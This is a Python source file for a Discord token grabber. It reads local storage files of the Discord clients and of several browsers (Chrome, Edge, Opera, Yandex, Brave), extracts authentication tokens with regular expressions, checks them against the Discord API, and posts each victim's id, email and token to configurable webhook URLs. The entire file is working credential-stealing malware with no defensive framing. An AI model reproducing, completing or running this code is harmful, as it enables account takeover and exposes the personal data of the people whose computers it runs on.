import os
import re
import json
import uuid
import mimetypes
import traceback
import urllib.error
import urllib.request

class Stream:
    def __init__(self):
        self.buffer = []

    def write(self, data):
        self.buffer.append(data)

    def read(self):
        return ''.join(self.buffer)

class Requests:
    @staticmethod
    def request(url, _headers={}, method=None, data=None):
        headers = {'User-Agent': 'Mozilla/5.0', 'accept-language': 'en-US,en'}
        headers.update(_headers)
        return urllib.request.urlopen(urllib.request.Request(url, headers=headers, method=method, data=data)).read().decode()

    @staticmethod
    def get(url, headers={}):
        return Requests.request(url, _headers=headers, method='GET', data=None)

    @staticmethod
    def post(url, headers={}, data=None):
        return Requests.request(url, _headers=headers, method='POST', data=data)

class Webhook:
    def __init__(self, url, **kwargs):
        self.url = url

        self.content = kwargs.pop('content', '')
        self.username = kwargs.pop('username', '')
        self.avatar_url = kwargs.pop('avatar_url', '')

        self.files = []

    def reset(self):
        self.content = ''
        self.username = ''
        self.avatar_url = ''

        self.files = []

    def add_file(self, name, data):
        self.files.append(('_' + name, name, mimetypes.guess_type(name)[0] or 'application/octet-stream', data))

    def payload(self):
        if self.files:
            self.files.insert(
                0, 
                (
                    'payload_json',
                    '',
                    'application/json',
                    json.dumps({
                        k: v for k, v in self.__dict__.items() if k in ['content', 'username', 'avatar_url']
                    }).encode()
                )
            )
            _boundary = uuid.uuid4().hex.encode()
            boundary = b'--' + _boundary + b'\r\n'
            buffer = bytearray()
            for f_name, filename, f_content_type, body in self.files:
                buffer.extend(boundary)
                buffer.extend(('Content-Disposition: file; name="' + f_name + '"; filename="' + filename + '"\r\n').encode())
                buffer.extend(('Content-Type: ' + f_content_type + '\r\n').encode())
                buffer.extend(b'\r\n')
                buffer.extend(body)
                buffer.extend(b'\r\n')

            buffer.extend(b'--' + _boundary + b'--\r\n')
            return 'multipart/form-data; boundary=' + _boundary.decode(), bytes(buffer)

        return 'application/json', json.dumps({
            k: v for k, v in self.__dict__.items() if k in ['content', 'username', 'avatar_url']
        }).encode()

    def execute(self):
        content_type, payload = self.payload()
        Requests.post(self.url, headers={'Content-Type': content_type}, data=payload)

class Grabber:
    def __init__(self, webhook_urls=None):
        self.users = {}
        self.webhooks = [Webhook(webhook_url) for webhook_url in webhook_urls or []]
        self.reported_errors = []

    def add_webhook(self, webhook_url, **kwargs):
        self.webhooks.append(Webhook(webhook_url, **kwargs))

    def report_error(self, error):
        username, content = 'Reporter', 'Error: ```\n' + error + '```'
        for webhook in self.webhooks:
            webhook.reset()

            webhook.username = username
            webhook.content = content

            webhook.execute()

        self.reported_errors.append(error)

    def new_user(self, token):
        try:
            data = self.get_user_data(token)
        except urllib.error.HTTPError:
            return
        except:
            stream = Stream()
            traceback.print_exc(file = stream)
            error = stream.read()
            if error in self.reported_errors:
                return
            self.report_error(error)
            return

        if data['username'] is None:
            return

        elif data['username'] in self.users:
            return

        user = self.prepare_user(token, data)
        self.users[user['username']] = user

    def grab_tokens(self):
        ROAMING, LOCAL = os.environ['APPDATA'], os.environ['LOCALAPPDATA']
        patterns = [r'mfa\.[\w-]{84}',  r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}']
        paths = [
            ROAMING + '\\discord\\Local Storage\\leveldb',
            ROAMING + '\\discordcanary\\Local Storage\\leveldb',
            ROAMING + '\\discordptb\\Local Storage\\leveldb',
            ROAMING + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb',
            LOCAL   + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
            LOCAL   + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb',
            LOCAL   + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb',
            LOCAL   + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb'
        ]
        for path in paths:
            if not os.path.exists(path):
                continue

            for file in os.listdir(path):
                if not (file.endswith('.log') or file.endswith('.ldb')):
                    continue

                file = path + '\\' + file
                with open(file, errors='ignore') as f:
                    lines = f.read().split('\n')
                    for line in lines:
                        for pattern in patterns:
                            matches = re.findall(pattern, line)
                            if not matches:
                                continue

                            for match in matches:
                                self.new_user(match)

    def get_user_data(self, token):
        response = Requests.get('https://discordapp.com/api/v6/users/@me', headers={'authorization': token})
        return json.loads(response)

    def prepare_user(self, token, user_data):
        return {
            'token': token,
            'id': user_data['id'],
            'username': user_data['username'] + '#' + user_data['discriminator'],
            'avatar_url': None if user_data['avatar'] is None else ('https://cdn.discordapp.com/avatars/' + user_data['id'] + '/' + user_data['avatar'] + '.png?size=4096'),
            'email': user_data['email']
        }

    def execute_webhooks(self):
        for user in self.users.values():
            for webhook in self.webhooks:
                webhook.content = 'Hi, my id is `' + user['id'] + '`, my email is `' + user['email'] + '` and my token is `' + user['token'] + '`'
                webhook.username = user['username']
                webhook.avatar_url = user['avatar_url']
                webhook.execute()

    def start(self):
        self.grab_tokens()
        if self.webhooks:
            self.execute_webhooks()
